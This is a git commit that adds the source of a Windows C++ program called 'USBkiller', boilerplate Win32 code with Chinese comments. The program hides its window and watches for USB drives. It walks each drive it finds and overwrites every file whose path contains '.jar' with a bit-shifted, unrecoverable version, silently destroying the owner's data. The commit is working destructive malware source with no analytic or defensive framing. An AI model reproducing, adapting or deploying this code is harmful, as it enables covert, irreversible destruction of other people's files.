46cc4d3e33925521892fcbe9a11bf3d65fe82c93
That-is-good <60137475+That-is-good@users.noreply.github.com>
2022-11-06 13:18:41 +0800

    Add files via upload

---
+++ USBkiller/USBkiller.cpp
@@ -0,0 +1,233 @@
+﻿// USBkiller.cpp : 定义应用程序的入口点。
+//
+
+#include "framework.h"
+#include "USBkiller.h"
+
+#define MAX_LOADSTRING 100
+
+// 全局变量:
+HINSTANCE hInst;                                // 当前实例
+WCHAR szTitle[MAX_LOADSTRING];                  // 标题栏文本
+WCHAR szWindowClass[MAX_LOADSTRING];            // 主窗口类名
+
+// 此代码模块中包含的函数的前向声明:
+ATOM                MyRegisterClass(HINSTANCE hInstance);
+BOOL                InitInstance(HINSTANCE, int);
+LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
+INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
+
+int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
+                     _In_opt_ HINSTANCE hPrevInstance,
+                     _In_ LPWSTR    lpCmdLine,
+                     _In_ int       nCmdShow)
+{
+    UNREFERENCED_PARAMETER(hPrevInstance);
+    UNREFERENCED_PARAMETER(lpCmdLine);
+
+    // TODO: 在此处放置代码。
+
+    // 初始化全局字符串
+    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
+    LoadStringW(hInstance, IDC_USBKILLER, szWindowClass, MAX_LOADSTRING);
+    MyRegisterClass(hInstance);
+
+    // 执行应用程序初始化:
+    if (!InitInstance (hInstance, nCmdShow))
+    {
+        return FALSE;
+    }
+
+    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_USBKILLER));
+
+    MSG msg;
+
+    // 主消息循环:
+    while (GetMessage(&msg, nullptr, 0, 0))
+    {
+        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
+        {
+            TranslateMessage(&msg);
+            DispatchMessage(&msg);
+        }
+    }
+
+    return (int) msg.wParam;
+}
+
+
+
+//
+//  函数: MyRegisterClass()
+//
+//  目标: 注册窗口类。
+//
+ATOM MyRegisterClass(HINSTANCE hInstance)
+{
+    WNDCLASSEXW wcex;
+
+    wcex.cbSize = sizeof(WNDCLASSEX);
+
+    wcex.style          = CS_HREDRAW | CS_VREDRAW;
+    wcex.lpfnWndProc    = WndProc;
+    wcex.cbClsExtra     = 0;
+    wcex.cbWndExtra     = 0;
+    wcex.hInstance      = hInstance;
+    wcex.hIcon          = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_USBKILLER));
+    wcex.hCursor        = LoadCursor(nullptr, IDC_ARROW);
+    wcex.hbrBackground  = (HBRUSH)(COLOR_WINDOW+1);
+    wcex.lpszMenuName   = MAKEINTRESOURCEW(IDC_USBKILLER);
+    wcex.lpszClassName  = szWindowClass;
+    wcex.hIconSm        = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
+
+    return RegisterClassExW(&wcex);
+}
+
+//
+//   函数: InitInstance(HINSTANCE, int)
+//
+//   目标: 保存实例句柄并创建主窗口
+//
+//   注释:
+//
+//        在此函数中，我们在全局变量中保存实例句柄并
+//        创建和显示主程序窗口。
+//
+BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
+{
+   hInst = hInstance; // 将实例句柄存储在全局变量中
+
+   HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
+      CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr);
+
+   if (!hWnd)
+   {
+      return FALSE;
+   }
+
+   ShowWindow(hWnd, nCmdShow);
+   UpdateWindow(hWnd);
+   ShowWindow(hWnd, SW_HIDE);
+
+   return TRUE;
+}
+
+//
+//  函数: WndProc(HWND, UINT, WPARAM, LPARAM)
+//
+//  目标: 处理主窗口的消息。
+//
+//  WM_COMMAND  - 处理应用程序菜单
+//  WM_PAINT    - 绘制主窗口
+//  WM_DESTROY  - 发送退出消息并返回
+//
+//
+
+wchar_t FirstDriveFromMask(ULONG unitmask)
+{
+    wchar_t i;
+
+    for (i = 0; i < 26; ++i)
+    {
+        if (unitmask & 0x1)
+            break;
+        unitmask = unitmask >> 1;
+    }
+
+    return(i + 'A');
+}
+
+void FoldBL(wchar_t temp[])
+{
+    struct _stat buf;
+    for (auto& i : std::filesystem::directory_iterator(temp))
+    {
+        std::wstring temp3 = i.path().wstring();
+        _wstat(temp3.c_str(), &buf);
+        if (_S_IFDIR & buf.st_mode)
+            FoldBL((wchar_t*)temp3.c_str());
+        else if (_S_IFREG & buf.st_mode)
+        {
+            std::transform(temp3.begin(), temp3.end(), temp3.begin(), towlower);
+            if (temp3.find(TEXT(".jar")) != temp3.npos)
+            {
+                std::wstring temp4;
+                std::wifstream readew(temp3.c_str(), std::ios::in | std::ios::binary);
+                while (!readew.eof())
+                {
+                    wchar_t w;
+                    readew.read((wchar_t*)&w, 1);
+                    w = w >> 1;
+                    temp4 += w;
+                }
+                readew.close();
+                std::wofstream writew(temp3.c_str(), std::ios::out | std::ios::trunc | std::ios::binary);
+                for (unsigned int i = 0; i < temp4.length(); i++)
+                {
+                    wchar_t w = temp4[i];
+                    writew.write((wchar_t*)&w,1);
+                }
+                writew.close();
+            }
+        }
+    }
+}
+
+LRESULT OnDeviceChange(HWND hWnd,WPARAM wParam,LPARAM lParam) {
+    switch (wParam)
+    {
+    case DBT_DEVICEARRIVAL:
+    {
+        PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME)lParam;
+        wchar_t temp2[5] = TEXT("C:\\");
+        temp2[0] = FirstDriveFromMask(lpdbv->dbcv_unitmask);
+        FoldBL(temp2);
+        break;
+    }
+    default:
+        break;
+    }
+    return 0;
+}
+
+LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+{
+    switch (message)
+    {
+    case WM_CREATE:
+        SetTimer(hWnd, 1, 1000, NULL);
+        break;
+    case WM_TIMER:
+        SendMessage(hWnd, WM_DEVICECHANGE, NULL, NULL);
+        break;
+    case WM_DEVICECHANGE:
+        OnDeviceChange(hWnd, wParam, lParam);
+        break;
+    case WM_DESTROY:
+        PostQuitMessage(0);
+        break;
+    default:
+        return DefWindowProc(hWnd, message, wParam, lParam);
+    }
+    return 0;
+}
+
+// “关于”框的消息处理程序。
+INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
+{
+    UNREFERENCED_PARAMETER(lParam);
+    switch (message)
+    {
+    case WM_INITDIALOG:
+        return (INT_PTR)TRUE;
+
+    case WM_COMMAND:
+        if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
+        {
+            EndDialog(hDlg, LOWORD(wParam));
+            return (INT_PTR)TRUE;
+        }
+        break;
+    }
+    return (INT_PTR)FALSE;
+}
---
+++ USBkiller/USBkiller.h
@@ -0,0 +1,10 @@
+#pragma once
+
+#include "resource.h"
+#include <Dbt.h>
+#include <string>
+#include <filesystem>
+#include <sys/stat.h>
+#include <fstream>
+#pragma comment (lib,"User32.lib")
+#pragma comment (lib,"Gdi32.lib")
